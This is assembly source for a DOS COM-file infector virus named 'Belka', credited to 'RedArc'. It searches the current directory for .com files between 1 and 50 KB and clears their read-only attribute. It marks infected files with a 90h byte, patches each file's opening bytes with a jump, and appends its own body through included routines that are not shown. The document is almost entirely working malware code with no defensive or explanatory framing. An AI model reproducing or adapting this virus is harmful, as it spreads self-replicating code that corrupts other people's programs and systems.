;Belka
;(c) RedArc
Model Tiny
.code
.386
org 100h
start:
       jmp VirusEntryPoint
       db 90h
db 100h dup (90h)
       ret
;---
MLength dw MyLength
CouMut db 10
_AD equ $-start
VirusEntryPoint:
       mov di,si
       mov ax, _AD
       add ax,100h
       mov si,ax
       mov bp,si
_RestoreFile:
       mov ax,9090h
       stosw
       mov ax,9090h
       stosw
_CreateFileMask:
       mov di,si
       add di,MyLength
       mov ax,'.*'
       stosw
       mov ax,'oc'
       stosw
       mov ax,0006dh
       stosw
_Memory:
       mov bx,8192
       mov ah,4ah
       int 21h
_SetDTA:
       mov ax,1a00h
       mov dx,MyLength
       add dx,16
       add dx,bp
       int 21h
_FindFirst:
       mov ax,4e00h
       mov dx,bp
       add dx,MyLength
       xor cx,cx
_Interrupt:
       int 21h
       jnb _TestFile
       mov ax,1a00h
       mov dx,80h
       int 21h
       mov ax,100h
       push ax
       ret
_TestFile:
       mov si,bp
       add si,MyLength
       add si,1ah+16
       lodsw
       cmp ax,1024
       jnb _TF1
_TF0:
       mov ax,4f00h
       jmp _Interrupt
_TF1:
       cmp ax,1024*50
       jb _OpenFile
       jmp _TF0
_OpenFile:
       mov ax,4301h
       mov dx,bp
       add dx,MyLength
       add dx,1eh+16
       mov cx,0
       int 21h
       mov ax,3d02h
       mov dx,bp
       add dx,MyLength
       add dx,1eh+16
       int 21h
_ReadFromFile:
       mov bx,ax
       mov ax,3f00h
       mov cx,4
       mov dx,bp
       add dx,MyLength
       push dx
       int 21h
       pop si
       add si,3
       lodsb
       cmp al,90h
       jne _TF2
_CloseFile:
       mov ax,3e00h
       int 21h
       mov ax,4301h
       mov dx,bp
       add dx,MyLength
       add dx,1eh+16
       mov cx,1
       int 21h
       jmp _TF0
_TF2:
       mov ax,4200h
       mov cx,0
       mov dx,0
       int 21h
       mov di,bp
       add di,MyLength
       add di,4
       mov ax,00e9h
       stosb
       mov si,bp
       add si,MyLength
       add si,1ah+16
       lodsw
       stosw
       mov al,90h
       stosb
       mov ax,4000h
       mov dx,bp
       add dx,MyLength
       add dx,4
       mov cx,4
       int 21h
       mov ax,4202h
       mov dx,0
       mov cx,0
       int 21h
       call _Manager
       jmp _CloseFile
;---
_@@2:
include manager.inc
include subrout.inc
_VCG_Length equ $-_@@2
MyLength equ $-start
end start
